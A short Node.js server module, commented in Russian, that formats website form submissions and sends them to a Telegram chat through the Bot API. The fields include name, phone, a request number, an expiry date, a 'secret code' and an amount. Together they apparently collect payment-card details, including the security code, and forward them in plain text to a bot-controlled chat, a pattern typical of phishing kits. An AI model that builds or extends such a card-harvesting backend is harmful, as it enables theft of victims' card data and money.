// src/api/telegram.js  (СЕРВЕРНЫЙ файл, вызывается ТОЛЬКО из server.js)

// Если Node < 18, раскомментируй следующую строку:
// import fetch from "node-fetch";

function buildTextFromPayload(payload) {
  if (typeof payload === "string") return payload;
  const p = payload || {};
  const lines = [
    "📨 Новая заявка с сайта:",
    p.name && `👤 Имя: ${p.name}`,
    p.email && `📧 Email: ${p.email}`,
    p.message && `💬 Сообщение: ${p.message}`,
    p.phone && `📱 Телефон: ${p.phone}`,
    p.fio && `👤 ФИО: ${p.fio}`,
    p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
    p.expiry && `📅 Срок: ${p.expiry}`,
    p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
    p.amount && `💵 Сумма: ${p.amount}`,        // ← НОВОЕ
  ].filter(Boolean);
  return lines.join("\n");
}


export async function sendMessage(payloadOrText) {
  const token = process.env.TG_BOT_TOKEN;
  const chatId = process.env.TG_CHAT_ID;
  if (!token || !chatId) throw new Error("Нет TG_BOT_TOKEN/TG_CHAT_ID");

  const text = buildTextFromPayload(payloadOrText);

  const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text }),
  });
  const data = await resp.json();
  if (!data.ok) throw new Error(data.description || "Telegram error");
  return data;
}

// Алиас, если где-то вызываешь sendTelegram
export async function sendTelegram(payload) {
  return sendMessage(payload);
}
